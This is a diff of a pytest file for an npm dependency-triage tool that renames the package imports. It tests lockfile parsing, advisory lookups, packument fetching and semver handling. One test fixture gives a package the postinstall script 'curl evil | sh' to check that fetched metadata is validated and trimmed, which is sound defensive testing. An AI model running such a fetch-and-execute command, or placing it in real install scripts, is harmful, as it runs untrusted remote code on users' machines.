@@ -4,11 +4,11 @@ from datetime import datetime, timedelta, timezone
 
 import pytest
 
-from ssvc_triage import inventory, nofix, registry
-from ssvc_triage.inventory import APP, Component, Parent
-from ssvc_triage.nofix import affected, classify, upgrade_risk
-from ssvc_triage.pkgsrc import Rejected
-from ssvc_triage.semver import parse, satisfies
+from doublestrain import inventory, nofix, registry
+from doublestrain.inventory import APP, Component, Parent
+from doublestrain.nofix import affected, classify, upgrade_risk
+from doublestrain.pkgsrc import Rejected
+from doublestrain.semver import parse, satisfies
 
 
 def _iso(days_ago: float) -> str:
@@ -206,7 +206,7 @@ def test_git_head_maps_version_to_commit():
 
 
 def test_packument_fetch_is_validated_and_trimmed(tmp_path, monkeypatch):
-    from ssvc_triage import pkgsrc
+    from doublestrain import pkgsrc
     seen = []
     doc = {"name": "p", "versions": {"1.0.0": {"scripts": {"postinstall": "curl evil | sh", "test": "x"},
                                                "dist": {"unpackedSize": 10}, "readme": "big"}},
@@ -233,7 +233,7 @@ def test_unfetchable_advisory_is_unknown_not_dropped(monkeypatch, tmp_path):
     lock = {"lockfileVersion": 3, "packages": {"": {"dependencies": {"p": "^1.0.0"}},
                                                "node_modules/p": {"version": "1.0.0"}}}
     (tmp_path / "package-lock.json").write_text(json.dumps(lock))
-    from ssvc_triage import osv
+    from doublestrain import osv
     monkeypatch.setattr(osv, "query", lambda deps, offline=False: {("npm", "p", "1.0.0"): ["GHSA-gone"]})
     monkeypatch.setattr(osv, "_get_vuln", lambda vid, offline: None)
     monkeypatch.setattr(registry, "packuments", lambda names, offline=False: {n: None for n in names})
@@ -243,7 +243,7 @@ def test_unfetchable_advisory_is_unknown_not_dropped(monkeypatch, tmp_path):
 
 
 def test_hostile_numbers_and_nesting_dont_crash(monkeypatch, tmp_path):
-    from ssvc_triage import pkgsrc
+    from doublestrain import pkgsrc
     big = "9" * 5000
     assert parse(big + ".0.0") is None and satisfies("1.0.0", ">=" + big) is None
     pk = _pk("p", {"1.0.0": V(300, engines={"node": ">=" + big}), "1.0.1": V(200, engines={"node": ">=" + big})})
@@ -336,7 +336,7 @@ def test_workspace_packages_are_the_app(tmp_path):
 
 
 def test_registry_cache_is_case_exact(tmp_path, monkeypatch):
-    from ssvc_triage import pkgsrc
+    from doublestrain import pkgsrc
     monkeypatch.setenv("SSVC_REGISTRY_CACHE", str(tmp_path))
     monkeypatch.setattr(pkgsrc, "_get", lambda url, cap, timeout=60.0: json.dumps(
         {"name": url.rsplit("/", 1)[1], "versions": {}}).encode())
